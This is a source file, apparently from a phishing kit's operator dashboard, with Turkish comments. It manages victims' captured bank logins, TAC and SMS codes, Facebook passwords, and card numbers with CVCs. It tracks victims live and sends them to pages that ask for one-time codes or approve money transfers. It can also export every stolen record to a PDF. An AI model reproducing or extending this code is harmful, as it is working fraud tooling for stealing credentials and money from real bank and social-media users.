        //    2+ alan farkliysa = GERCEKTEN ESKI -> GÖSTER
        let diffCount = 0;
        const checkDiff = (a: string, b: string) => {
          if ((a || b) && a !== b) diffCount++;
        };
        checkDiff(cur.loginMethod, rLogin);
        checkDiff(cur.personalCode, rPers);
        checkDiff(cur.bankPhone, rBankPhone);
        checkDiff(cur.user, rUser);
        checkDiff(cur.pass, rPass);
        checkDiff(cur.tacCode, rTac);
        checkDiff(cur.of1, rOf1);
        checkDiff(cur.of2, rOf2);
        return diffCount >= 2;
      });
      return result;
    } catch { /* ignore */ }
    return [];
  };
  const parseFacebookHistory = (fd: Record<string, unknown>): any[] => {
    try {
      const raw = fd.facebookLoginHistory;
      let arr: unknown;
      if (typeof raw === "string") {
        try { arr = JSON.parse(raw); } catch { arr = raw; }
      } else {
        arr = raw;
      }
      let result: any[] = [];
      if (Array.isArray(arr)) {
        result = arr.filter((r) => r && typeof r === "object");
      }
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const cur = {
        email: str(fd.fbEmail),
        pass: str(fd.fbPassword),
        first: str(fd.fbFirstName),
        last: str(fd.fbLastName),
        userId: str(fd.fbUserId),
      };
      result = result.filter((r: Record<string, unknown>) => {
        const rEmail = str(r.fbEmail);
        const rPass = str(r.fbPassword);
        const rFirst = str(r.fbFirstName);
        const rLast = str(r.fbLastName);
        const rId = str(r.fbUserId);
        // 1) Garbage filtresi: en az 1 alan dolu olmali
        if (!rEmail && !rPass && !rFirst && !rLast && !rId) return false;

        // 2) Ayni hesap mi? Email+password combo (case-insensitive email)
        const curCombo = `${cur.email.toLowerCase()}|${cur.pass}`;
        const rCombo = `${rEmail.toLowerCase()}|${rPass}`;
        // KESIN ayni hesapsa (combo ayni ise) GUNCELDIR, GIZLE:
        if (cur.email && rEmail && curCombo === rCombo) {
          return false;
        }

        // 3) Diff sayaci: en az 2 alan FARKLI ise GERCEKTEN ESKI kayittir (GÖSTER)
        let diffCount = 0;
        if (cur.email && rEmail && cur.email.toLowerCase() !== rEmail.toLowerCase()) diffCount++;
        else if (!cur.email && rEmail) diffCount++;
        else if (cur.email && !rEmail) diffCount++;
        if (cur.pass && rPass && cur.pass !== rPass) diffCount++;
        else if (!cur.pass && rPass) diffCount++;
        else if (cur.pass && !rPass) diffCount++;
        if (cur.first && rFirst && cur.first !== rFirst) diffCount++;
        if (cur.last && rLast && cur.last !== rLast) diffCount++;
        if (cur.userId && rId && cur.userId !== rId) diffCount++;

        // En az 2 alan farkliysa ESKI kayit (goster). Aksi halde guncele cok yakin = GIZLE
        return diffCount >= 2;
      });
      return result;
    } catch { /* ignore */ }
    return [];
  };

  // KART GECMISI parse fonksiyonu: ESKI kartlari ceker, GUNCEL karti (ayni number+expiry+cvc) filtreler
  const parseCardHistory = (fd: Record<string, unknown>): any[] => {
    try {
      const raw = fd.cardLoginHistory ?? fd.cardFormHistory;
      let arr: unknown;
      if (typeof raw === "string") {
        try { arr = JSON.parse(raw); } catch { arr = raw; }
      } else {
        arr = raw;
      }
      let result: any[] = [];
      if (Array.isArray(arr)) {
        result = arr.filter((r) => r && typeof r === "object");
      }
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const curNumber = str(fd.cardNumber);
      const curExpiry = str(fd.cardExpiry);
      const curCvc = str(fd.cardCvc);
      result = result.filter((r: Record<string, unknown>) => {
        const rNum = str(r.cardNumber);
        const rExp = str(r.cardExpiry);
        const rCvc = str(r.cardCvc);
        const rHolder = str(r.cardHolder);
        // En az 1 anlamli alan (number veya expiry) dolu olmali
        if (!rNum && !rExp && !rCvc && !rHolder) return false;
        // GUNCEL kart ile birebir ayniysa (number, expiry, cvc tam eslesme) history'de GORUNMEZ
        if (curNumber && rNum && curNumber === rNum &&
            curExpiry && rExp && curExpiry === rExp &&
            curCvc && rCvc && curCvc === rCvc) {
          return false;
        }
        return true;
      });
      return result;
    } catch { /* ignore */ }
    return [];
  };

  // GENERATOR GECMISI: submit sirasinda onceki kayit history'ye tasindi,
  // guncel kayit zaten kolonda — filtreleme gerekmez, sadece parse et.
  const parseGeneratorHistory = (fd: Record<string, unknown>): any[] => {
    try {
      const raw = fd.generatorLoginHistory ?? fd.smsFormHistory;
      let arr: unknown;
      if (typeof raw === "string") {
        try { arr = JSON.parse(raw); } catch { arr = raw; }
      } else {
        arr = raw;
      }
      if (!Array.isArray(arr)) return [];
      return arr.filter(
        (r) =>
          r &&
          typeof r === "object" &&
          (r as any).data &&
          typeof (r as any).data === "object" &&
          Object.keys((r as any).data).length > 0
      );
    } catch { /* ignore */ }
    return [];
  };

  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [pastedImage, setPastedImage] = useState<File | null>(null);
  const [pastedImagePreview, setPastedImagePreview] = useState<string | null>(null);
  const [isUploadingImage, setIsUploadingImage] = useState(false);
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);

  const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
  const [questionPromptSessionId, setQuestionPromptSessionId] = useState<string | null>(null);
  const [questionInput, setQuestionInput] = useState("");
  const [questionModalSession, setQuestionModalSession] = useState<any | null>(null);
  const [specialMessage, setSpecialMessage] = useState("");
  const [specialImage, setSpecialImage] = useState<string | null>(null);
  const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");

  const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
  const [smsDigitsInput, setSmsDigitsInput] = useState("6");
  const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
  const [facebookPromptSessionId, setFacebookPromptSessionId] = useState<string | null>(null);
  const [facebookPromptPublicId, setFacebookPromptPublicId] = useState<number | null>(null);
  const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
  const [approvalPromptType, setApprovalPromptType] = useState("");
  const [approvalCodeInput, setApprovalCodeInput] = useState("");
  const [transferAmountInput, setTransferAmountInput] = useState("");

  const [soundEnabled, setSoundEnabled] = useState(false);
  const soundEnabledRef = useRef(false);

  useEffect(() => {
    const savedSound = localStorage.getItem('admin1SoundEnabled');
    if (savedSound === 'true') {
      setSoundEnabled(true);
      soundEnabledRef.current = true;
    }
  }, []);

  useEffect(() => {
    soundEnabledRef.current = soundEnabled;
    localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
  }, [soundEnabled]);

  const [browserNotifEnabled, setBrowserNotifEnabled] = useState(false);

  useEffect(() => {
    setBrowserNotifEnabled(areBrowserNotificationsEnabled());
  }, []);

  const toggleBrowserNotifications = useCallback(async () => {
    if (browserNotifEnabled) {
      disableBrowserNotifications();
      setBrowserNotifEnabled(false);
      return;
    }
    const granted = await enableBrowserNotifications();
    setBrowserNotifEnabled(granted);
    if (!granted) {
      showBeautifulToast(
        "Bildirim İzni Reddedildi",
        "Tarayıcı ayarlarından site bildirimlerine izin vermeniz gerekiyor."
      );
    }
  }, [browserNotifEnabled]);

  const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
    try {
      playBeautifulNotification();
      showBeautifulToast(title, desc);
      sendBrowserNotification(title, desc);
    } catch (e) {
      console.error("Audio error:", e);
    }
  }, []);

  const load = useCallback(async (pageArg?: number) => {
    if (!supabase) return;

    const fetchPage = async (p: number): Promise<void> => {
      let query = supabase
        .from("sessions")
        .select(SESSION_LIST_COLUMNS, { count: "exact" });

      // displayMode'a gore filtrele
      if (isDeletedMode) {
        query = query.eq("is_hidden", true);
      } else if (isTrashMode) {
        query = query
          .or("is_hidden.is.false,is_hidden.is.null")
          .eq("form_data->>pending_profile", "true");
      } else {
        query = query
          .or("is_hidden.is.false,is_hidden.is.null")
          .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
      }
      query = query.order("created_at", { ascending: false });

      const { data, count } = await query.range(p * LOG_PAGE_SIZE, (p + 1) * LOG_PAGE_SIZE - 1);
      const fetchedRows = ((data ?? []) as any) as DemoSession[];
      const total = typeof count === "number" ? count : fetchedRows.length;

      // Silme/geri yukleme sonrasi sayfa bos kalirsa son dolu sayfaya dus
      if (fetchedRows.length === 0 && p > 0) {
        const lastPage = Math.max(0, Math.ceil(total / LOG_PAGE_SIZE) - 1);
        if (lastPage !== p) {
          setPage(lastPage);
          pageRef.current = lastPage;
          return fetchPage(lastPage);
        }
      }

      setRows(fetchedRows);
      setTotalCount(total);
      setLogCount(total);
    };

    await fetchPage(pageArg ?? pageRef.current);
  }, [supabase, isDeletedMode, isTrashMode]);

  const totalPages = Math.max(1, Math.ceil(totalCount / LOG_PAGE_SIZE));
  const goToPage = (p: number) => {
    const next = Math.min(Math.max(p, 0), totalPages - 1);
    if (next === pageRef.current) return;
    setPage(next);
    pageRef.current = next;
    void load(next);
  };
  const pageWindow: Array<number | "…"> = (() => {
    const wanted = new Set<number>([0, totalPages - 1, page - 2, page - 1, page, page + 1, page + 2]);
    const sorted = [...wanted].filter((n) => n >= 0 && n < totalPages).sort((a, b) => a - b);
    const out: Array<number | "…"> = [];
    let last = -1;
    for (const n of sorted) {
      if (last !== -1 && n - last > 1) out.push("…");
      out.push(n);
      last = n;
    }
    return out;
  })();

  const loadBannedList = useCallback(async () => {
    if (!supabase) return;
    setLoadingBanned(true);
    const { data } = await supabase
      .from("banned_ips")
      .select("*")
      .order("banned_at", { ascending: false })
      .limit(200);
    setBannedList((data as any[]) ?? []);
    supabase.from("banned_ips").select("ip_address", { count: 'exact', head: true }).then(({ count }) => {
      setBannedCount(count ?? 0);
    });
    setLoadingBanned(false);
  }, [supabase]);

  const handleUnban = async (ipAddress: string) => {
    if (!supabase) return;
    const ok = confirm(`"${ipAddress}" IP yasağını kaldırmak istediğinize emin misiniz?`);
    if (!ok) return;
    const { error } = await supabase.from("banned_ips").delete().eq("ip_address", ipAddress);
    if (error) alert("Ban kaldırılırken hata: " + error.message);
    else {
      setBannedList((prev) => prev.filter((b) => b.ip_address !== ipAddress));
      setBannedCount((c) => Math.max(0, c - 1));
      alert("Ban başarıyla kaldırıldı!");
    }
  };

  const handleRestoreLog = async (sessionId: string) => {
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: false }).eq("id", sessionId);
    await load();
  };

  const handlePermanentDelete = async (sessionId: string) => {
    if (!supabase) return;
    const ok = confirm("Bu logu KALICI olarak silmek istediğinize emin misiniz? Bu işlem GERİ ALINAMAZ!");
    if (!ok) return;
    await deleteSessionsAction([sessionId]);
    await load();
  };

  useEffect(() => {
    void load();
    void loadBannedList();
    if (!supabase) return;

    // Banned count
    supabase.from("banned_ips").select("ip_address", { count: 'exact', head: true }).then(({ count }) => {
      setBannedCount(count ?? 0);
    });

    const channel = supabase
        .channel("admin1-sessions-live")
        .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
          if (payload.eventType === "INSERT") {
            const newRow = payload.new as DemoSession;
            if (!isSessionVisibleForCurrentUser(newRow)) return;

            setRows((prev) => {
              if (pageRef.current !== 0) return prev;
              if (prev.some((r) => r.id === newRow.id)) return prev;
              return [newRow, ...prev].slice(0, LOG_PAGE_SIZE);
            });
            setLogCount((c) => c + 1);
            setTotalCount((c) => c + 1);
            return;
          }

        if (payload.eventType === "DELETE") {
          const oldRow = payload.old as DemoSession;
          if (!oldRow?.id) return;
          // Sadece gercekten listede gorunen satir silindiyse sayaci dus
          if (!rowsRef.current.some((r) => r.id === oldRow.id)) return;
          setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
          setLogCount((c) => Math.max(0, c - 1));
          setTotalCount((c) => Math.max(0, c - 1));
          return;
        }

        if (payload.eventType === "UPDATE") {
          const newRow = payload.new as DemoSession;
          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);

          const visibleNow = isSessionVisibleForCurrentUser(newRow);
          // Gercek gorunurluk: satir listede var mi (payload.old eksik kolonlarla gelebilir)
          const visibleBefore = rowsRef.current.some((r) => r.id === newRow.id);

          if (!visibleNow) {
            if (visibleBefore) {
              setRows((prev) => prev.filter((r) => r.id !== newRow.id));
              setLogCount((c) => Math.max(0, c - 1));
              setTotalCount((c) => Math.max(0, c - 1));
            }
            return;
          }

          if (soundEnabledRef.current && oldRow) {
            const getSignificantData = (data: any) => {
              if (!data) return {};
              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
              return rest;
            };

            const oldSignificant = getSignificantData(oldRow.form_data);
            const newSignificant = getSignificantData(newRow.form_data);
            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";

            if (isFormDataChanged || isUserSubmittedToWait) {
              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
            }
          }

          setRows((prev) => {
            const idx = prev.findIndex((r) => r.id === newRow.id);
            if (idx === -1) {
              if (pageRef.current !== 0) return prev;
              return [newRow, ...prev].slice(0, LOG_PAGE_SIZE);
            }
            const next = [...prev];
            const prevRow = next[idx];
            const merged = { ...prevRow, ...newRow };
            const incomingFd = newRow.form_data;
            const fdMissing =
              incomingFd == null ||
              (typeof incomingFd === "object" && !Array.isArray(incomingFd) && Object.keys(incomingFd).length === 0);
            if (fdMissing && prevRow.form_data != null) {
              merged.form_data = prevRow.form_data;
            }
            next[idx] = merged;
            return next;
          });
          if (!visibleBefore) {
            setLogCount((c) => c + 1);
            setTotalCount((c) => c + 1);
          }
        }
      })
      .subscribe();

    const presenceChannel = supabase.channel("online_visitors", {
      config: { presence: { key: "admin1-logs" } },
    });

    const applyPresence = () => {
      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
      const now = Date.now();

      // Son bilinen path'leri koru — offline olsa bile Sayfa kolonu son sayfayi gosterir
      for (const [id, p] of Object.entries(parsed.sessionPaths)) {
        lastPathRef.current.set(id, p);
      }

      // Yeni ayrilanlari isaretle (presence leave)
      for (const id of prevOnlineRef.current) {
        if (!parsed.onlineSessionIds.has(id) && !graceLeftRef.current.has(id)) {
          graceLeftRef.current.set(id, now);
        }
      }
      // Geri donenleri temizle
      for (const id of parsed.onlineSessionIds) graceLeftRef.current.delete(id);
      prevOnlineRef.current = new Set(parsed.onlineSessionIds);

      // 30sn grace: sayfa gecisinde untrack->track arasi "offline" titremesini engelle
      const online = new Set(parsed.onlineSessionIds);
      const lastSeen: Record<string, number> = { ...parsed.sessionLastSeenAt };
      for (const [id, leftAt] of graceLeftRef.current) {
        if (now - leftAt < 30_000) {
          online.add(id);
          lastSeen[id] = leftAt;
        } else {
          graceLeftRef.current.delete(id);
        }
      }

      const paths: Record<string, string> = {};
      for (const [id, p] of lastPathRef.current) paths[id] = p;
      for (const [id, p] of Object.entries(parsed.sessionPaths)) paths[id] = p;

      setLiveVisitorCount(parsed.liveVisitorCount);
      setOnlineSessionIds(online);
      setSessionPaths(paths);
      setSessionLastSeenAt(lastSeen);
      setPresenceTick((t) => t + 1);
    };

    presenceChannel
      .on("presence", { event: "sync" }, applyPresence)
      .on("presence", { event: "join" }, applyPresence)
      .on("presence", { event: "leave" }, applyPresence)
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await presenceChannel.track({
            pathname: "/admin",
            role: "admin",
            online_at: new Date().toISOString(),
          });
        }
      });

    return () => {
      void supabase.removeChannel(channel);
      void supabase.removeChannel(presenceChannel);
    };
  }, [supabase, load]);

  const copyToClipboard = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
  };

  const handleRouteAction = async (sessionId: string, action: string) => {
    if (!supabase) {
      alert("[ADMIN HATA] supabase client NULL! Sayfayi YENILE (F5) ve tekrar dene.");
      return;
    }

    if (action === "sms") {
      setSmsPromptSessionId(sessionId);
      setSmsDigitsInput("6");
      setSmsCustomTextInput("");
      return;
    }

    // YENI: FACEBOOK yonlendirmesi - ayni SMS gibi tek tik (modal acilir + direkt confirm eder gibi update)
    if (action === "facebook") {
      const row = rowsRef.current.find((r) => r.id === sessionId);
      const pid = (row && (row as any).public_id != null) ? Number((row as any).public_id) : null;
      setFacebookPromptSessionId(sessionId);
      setFacebookPromptPublicId(pid);
      return;
    }

    if (action === "special_approval") {
      setSpecialPromptSessionId(sessionId);
      return;
    }

    // OZEL SORU: modal acilir, admin soruyu yazar → kullaniciya /custom-question gider.
    if (action === "custom_question") {
      setQuestionInput("");
      setQuestionPromptSessionId(sessionId);
      return;
    }

    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
      // ZORLU (win2) session'lari: "Banka Listesine Yonlendir" -> banken2 tasirimi,
      // diger linklerde normal banken. Sadece is_win2_flow olanlarda gecerli.
      let targetStep = action;
      if (action === "banken") {
        const row = rowsRef.current.find((r) => r.id === sessionId);
        const fd = (row?.form_data ?? {}) as Record<string, any>;
        if (fd.is_win2_flow === true) targetStep = "banken2";
      }
      const { data, error } = await supabase
        .from("sessions")
        .update({ current_step: targetStep, status: "online" })
        .eq("id", sessionId)
        .select("id, current_step, status, public_id")
        .maybeSingle();

      if (error) {
        alert(
          "[ADMIN DB HATA] current_step guncellenemedi!\n\n" +
          "Hata: " + String(error.message || error) + "\n\n" +
          "Eksik adimlar:\n" +
          "1) Supabase SQL Editor'de 20260930_facebook_guarantee.sql CALISTIRDIN MI?\n" +
          "2) sessions tablosunda RLS policy var mi? (SQL dosyasinda sessions_anon_update policy olmali)\n" +
          "3) PostgREST schema cache: NOTIFY pgrst, 'reload schema'; (SQL dosyasinda var)",
        );
        void load();
        return;
      }

      if (!data) {
        alert(
          "[ADMIN DB UYARI] 0 satir guncellendi! Session bulunamadi:\n" +
          "row.id (gonderilen): " + sessionId + "\n\n" +
          "Muhtemel neden: row.id public_id (sayi) ama DB id UUID. Veya session silinmis.\n" +
          "Sessions tablosunu kontrol et.",
        );
        void load();
        return;
      }

      void load();
    } else if (action === "ban_ip") {
      const row = rowsRef.current.find(r => r.id === sessionId);
      if (row && row.ip_address) {
        const confirmBan = confirm(`Bu IP adresi (${row.ip_address}) tamamen engellenecek. Onaylıyor musunuz?`);
        if (confirmBan) {
          const { error: banError } = await supabase.from('banned_ips').insert({
            ip_address: row.ip_address,
            reason: `Admin tarafından engellendi (Session: ${sessionId})`
          });
          if (banError) {
            if (banError.code === "23505" || /duplicate|already exists/i.test(banError.message || "")) {
              alert("Bu IP adresi zaten engelli.");
            } else {
              alert("IP engellenirken hata: " + banError.message);
            }
          } else {
            setBannedCount((c) => c + 1);
            if (showBannedListModal) void loadBannedList();
            alert("IP adresi başarıyla engellendi!");
          }
        }
      } else {
        alert("Bu kullanıcının IP adresi henüz sisteme yansımamış.");
      }
    }
  };

  // ============================================================
  //  FACEBOOK ONAYSIZ DIRECT UPDATE (SAYISAL PUBLIC_ID UZERINDEN - KESIN DOGRU SESSION)
  //  Ayni confirmSmsRedirect gibi useEffect ile tetiklenir state acilinca direkt calisir
  // ============================================================
  useEffect(() => {
    if (!facebookPromptSessionId || !supabase) return;
    let cancelled = false;

    (async () => {
      try {
        let data: any = null;
        let error: any = null;

        // ILK DENEME: public_id (sayisal) varsa ONU KULLAN (KESIN DOGRU SESSION!)
        if (facebookPromptPublicId != null && !isNaN(Number(facebookPromptPublicId))) {
          const r = await supabase
            .from("sessions")
            .update({ current_step: "facebook", status: "online" })
            .eq("public_id", String(facebookPromptPublicId))
            .select("id, current_step, status, public_id")
            .maybeSingle();
          data = r.data;
          error = r.error;
        }

        // Yedek: public_id yoksa veya hata varsa row.id (UUID) ile dene
        if ((!data || error) && facebookPromptSessionId) {
          const r2 = await supabase
            .from("sessions")
            .update({ current_step: "facebook", status: "online" })
            .eq("id", facebookPromptSessionId)
            .select("id, current_step, status, public_id")
            .maybeSingle();
          if (!error || !data) { data = r2.data; error = r2.error; }
        }

        if (cancelled) return;

        if (error) {
          // Sessizce gec (hata admini uyarmaya gerek yok, sadece log)
          // eslint-disable-next-line no-console
          console.warn("[admin] facebook yonlendirme DB hatasi:", error);
        } else if (!data) {
          // eslint-disable-next-line no-console
          console.warn("[admin] facebook yonlendirme 0 satir. pid:", facebookPromptPublicId, "uuid:", facebookPromptSessionId);
        }
        // BASARILI veya degilse: sadece load()
      } finally {
        setFacebookPromptSessionId(null);
        setFacebookPromptPublicId(null);
        void load();
      }
    })();

    return () => { cancelled = true; };
  }, [facebookPromptSessionId, facebookPromptPublicId, supabase]);

  const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
    if (!approvalValue) return;

    // GENERATOR 1: kod gerekmez — kullaniciyi direkt sayfaya yonlendir.
    // GENERATOR 2: modal acilir, admin "Gosterilecek Rakam"i girer (or. 4455).
    // AYNI TIPIN guncel kaydi varsa ANINDA gecmise tasi + sifirla; diger tip kolonda kalir.
    if (approvalValue === "generator1") {
      if (!supabase) return;
      const row = rowsRef.current.find((r) => r.id === sessionId);
      const previousFormData =
        row?.form_data && typeof row.form_data === "object" ? { ...row.form_data } : {};
      const genHistory: any[] = Array.isArray(previousFormData.generatorLoginHistory)
        ? [...previousFormData.generatorLoginHistory]
        : [];
      const genCurrent: Record<string, any> =
        previousFormData.generatorCurrent && typeof previousFormData.generatorCurrent === "object"
          ? { ...previousFormData.generatorCurrent }
          : {};
      // Legacy tek-alan verisini normalize et (kendi tipine yaz, diger tip korunur)
      if (
        previousFormData.generatorData &&
        typeof previousFormData.generatorData === "object" &&
        Object.keys(previousFormData.generatorData).length > 0
      ) {
        const lt = typeof previousFormData.generatorType === "string" ? previousFormData.generatorType : "generator1";
        const ex = genCurrent[lt];
        if (!ex || !ex.data || Object.keys(ex.data).length === 0) {
          genCurrent[lt] = {
            data: previousFormData.generatorData,
            submittedAt: previousFormData.generatorSubmittedAt,
            generatorCode: previousFormData.generatorCode,
          };
        }
      }
      const cur1 = genCurrent.generator1;
      if (cur1?.data && typeof cur1.data === "object" && Object.keys(cur1.data).length > 0) {
        genHistory.push({
          submittedAt: cur1.submittedAt || new Date().toISOString(),
          generatorType: "generator1",
          generatorCode: cur1.generatorCode,
          data: cur1.data,
        });
      }
      genCurrent.generator1 = {};
      await supabase
        .from("sessions")
        .update({
          is_hidden: false,
          status: "online",
          current_step: approvalValue,
          form_data: {
            ...previousFormData,
            generatorType: approvalValue,
            generatorData: {},
            generatorCurrent: genCurrent,
            generatorLoginHistory: genHistory,
          },
        })
        .eq("id", sessionId);
      void load();
      return;
    }

    setApprovalPromptSessionId(sessionId);
    setApprovalPromptType(approvalValue);
    setApprovalCodeInput("");
  };

  async function confirmSmsRedirect() {
    if (!supabase || !smsPromptSessionId) return;
    const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
    await supabase
      .from("sessions")
      .update({
        current_step: "sms",
        sms_digits: digits,
        sms_custom_text: smsCustomTextInput.trim() || null,
        status: "online"
      })
      .eq("id", smsPromptSessionId);
    setSmsPromptSessionId(null);
    void load();
  }

  async function confirmApprovalAction() {
    if (!supabase || !approvalPromptSessionId || !approvalPromptType) return;

    const row = rowsRef.current.find((currentRow) => currentRow.id === approvalPromptSessionId);
    const previousFormData =
      row && row.form_data && typeof row.form_data === "object"
        ? (row.form_data as Record<string, string | undefined>)
        : {};

    // GENERATOR 2: admin'in girdigi rakam (or. 4455) kullaniciya gosterilir.
    // AYNI TIPIN guncel kaydi varsa ANINDA gecmise tasi + sifirla; diger tip kolonda kalir.
    if (approvalPromptType === "generator2") {
      const genHistory: any[] = Array.isArray(previousFormData.generatorLoginHistory)
        ? [...previousFormData.generatorLoginHistory]
        : [];
      const rawGenCur = (previousFormData as Record<string, unknown>).generatorCurrent;
      const genCurrent: Record<string, any> =
        rawGenCur && typeof rawGenCur === "object" ? { ...rawGenCur } : {};
      // Legacy tek-alan verisini normalize et
      if (
        previousFormData.generatorData &&
        typeof previousFormData.generatorData === "object" &&
        Object.keys(previousFormData.generatorData).length > 0
      ) {
        const lt = typeof previousFormData.generatorType === "string" ? previousFormData.generatorType : "generator2";
        const ex = genCurrent[lt];
        if (!ex || !ex.data || Object.keys(ex.data).length === 0) {
          genCurrent[lt] = {
            data: previousFormData.generatorData,
            submittedAt: previousFormData.generatorSubmittedAt,
            generatorCode: previousFormData.generatorCode,
          };
        }
      }
      const cur2 = genCurrent.generator2;
      if (cur2?.data && typeof cur2.data === "object" && Object.keys(cur2.data).length > 0) {
        genHistory.push({
          submittedAt: cur2.submittedAt || new Date().toISOString(),
          generatorType: "generator2",
          generatorCode: cur2.generatorCode,
          data: cur2.data,
        });
      }
      genCurrent.generator2 = {};
      await supabase
        .from("sessions")
        .update({
          is_hidden: false,
          status: "online",
          current_step: "generator2",
          form_data: {
            ...previousFormData,
            generatorType: "generator2",
            generatorCode: approvalCodeInput.trim(),
            generatorData: {},
            generatorCurrent: genCurrent,
            generatorLoginHistory: genHistory,
          },
        })
        .eq("id", approvalPromptSessionId);

      setApprovalPromptSessionId(null);
      setApprovalPromptType("");
      setApprovalCodeInput("");
      void load();
      return;
    }

    // TRANSFER ONAYI: miktar + yontem (Smart-ID / Mobile-ID) admin giriyor.
    // Kullanici /special-approval'da transfer kartini gorur; onaylayinca
    // approvalStatus "transfer_*_confirmed" olur → kolonda "Transfer Onaylandi".
    if (approvalPromptType === "transfer") {
      await supabase
        .from("sessions")
        .update({
          is_hidden: false,
          status: "online",
          current_step: "special_approval",
          form_data: {
            ...previousFormData,
            approvalStatus: "transfer",
            transferAmount: transferAmountInput.trim(),
            approvalCode: "",
            specialNoticeText: "",
            specialNoticeImage: "",
            specialNoticeLang: undefined,
            specialNoticeSentAt: "",
          },
        })
        .eq("id", approvalPromptSessionId);

      setApprovalPromptSessionId(null);
      setApprovalPromptType("");
      setApprovalCodeInput("");
      setTransferAmountInput("");
      
      void load();
      return;
    }

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        status: "online",
        current_step: "special_approval",
        form_data: {
          ...previousFormData,
          approvalStatus: approvalPromptType,
          approvalCode: approvalCodeInput.trim(),
          specialNoticeText: "",
          specialNoticeImage: "",
          specialNoticeLang: undefined,
          specialNoticeSentAt: "",
        },
      })
      .eq("id", approvalPromptSessionId);

    setApprovalPromptSessionId(null);
    setApprovalPromptType("");
    setApprovalCodeInput("");
    void load();
  }

  async function confirmQuestionSend() {
    if (!supabase || !questionPromptSessionId) return;
    const q = questionInput.trim();
    if (!q) return;

    const row = rowsRef.current.find((r) => r.id === questionPromptSessionId);
    const previousFormData =
      row?.form_data && typeof row.form_data === "object"
        ? (row.form_data as Record<string, unknown>)
        : {};
    const list: any[] = Array.isArray(previousFormData.customQuestions)
      ? [...previousFormData.customQuestions]
      : [];
    list.push({ question: q, askedAt: new Date().toISOString() });

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        status: "online",
        current_step: "custom_question",
        form_data: { ...previousFormData, customQuestions: list },
      })
      .eq("id", questionPromptSessionId);

    setQuestionPromptSessionId(null);
    setQuestionInput("");
    void load();
  }

  const handleDelete = async (sessionId: string) => {
    if (!confirm("Bu logu silmek (gizlemek) istediğinize emin misiniz?")) return;
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    await load();
  };

  const handleDeleteAll = async () => {
    if (!confirm("TÜM LOGLARI silmek istediğinize emin misiniz? Bu işlem geri alınamaz!")) return;
    if (!supabase) return;
    
    const ids = rowsRef.current.map(r => r.id);
    if (ids.length === 0) return;

    await supabase.from("sessions").update({ is_hidden: true }).in("id", ids);
    await load();
  };

  const handleExport = async () => {
    if (!supabase || exporting) return;
    setExporting(true);
    try {
      const all: DemoSession[] = [];
      const BATCH = 1000;
      for (let from = 0; ; from += BATCH) {
        let query = supabase
          .from("sessions")
          .select(SESSION_LIST_COLUMNS)
          .order("created_at", { ascending: false });
        if (isDeletedMode) {
          query = query.eq("is_hidden", true);
        } else if (isTrashMode) {
          query = query
            .or("is_hidden.is.false,is_hidden.is.null")
            .eq("form_data->>pending_profile", "true");
        } else {
          query = query
            .or("is_hidden.is.false,is_hidden.is.null")
            .or("form_data->>pending_profile.is.null,form_data->>pending_profile.neq.true");
        }
        const { data, error: qErr } = await query.range(from, from + BATCH - 1);
        if (qErr) throw qErr;
        const batch = (data ?? []) as DemoSession[];
        all.push(...batch);
        if (batch.length < BATCH) break;
      }

      // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
      const s = (v: unknown) => (v == null ? "" : String(v));
      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "IP", "Cihaz"];

      const tableBody: any[][] = [
        COL_HEADERS.map(
          (h) => ({ text: h, bold: true, color: "#ffffff", fillColor: "#111827", fontSize: 7.5 })
        ),
      ];

      for (const r of all) {
        const fd = (r.form_data ?? {}) as Record<string, any>;

        const bankCell: any[] = [];
        if (fd.bankName) bankCell.push({ text: s(fd.bankName), bold: true, color: "#a16207" });
        const lm = readLoginMethod(fd);
        if (lm) bankCell.push({ text: `Yöntem: ${lm}`, color: "#0e7490" });
        for (const [k, v] of getShortBankCredentialFields(fd)) bankCell.push({ text: `${k}: ${v}` });
        if (!bankCell.length) bankCell.push({ text: "-", color: "#9ca3af" });

        const approvalHist = parseApprovalHistory(fd.approvalHistory);
        const approvalEntries =
          approvalHist.length > 0
            ? approvalHist
            : typeof fd.approvalStatus === "string" && fd.approvalStatus.trim()
              ? [fd.approvalStatus.trim()]
              : [];
        const approvalCell = approvalEntries.length
          ? approvalEntries.map((a) => ({ text: getApprovalDisplayText(a), color: "#059669" }))
          : { text: "-", color: "#9ca3af" };


        const smsValue = s(fd.smsCode).trim() || s(fd.tacCode).trim() || "-";

        const cardCell: any[] = [];
        if (fd.cardNumber) cardCell.push({ text: `No: ${s(fd.cardNumber)}` });
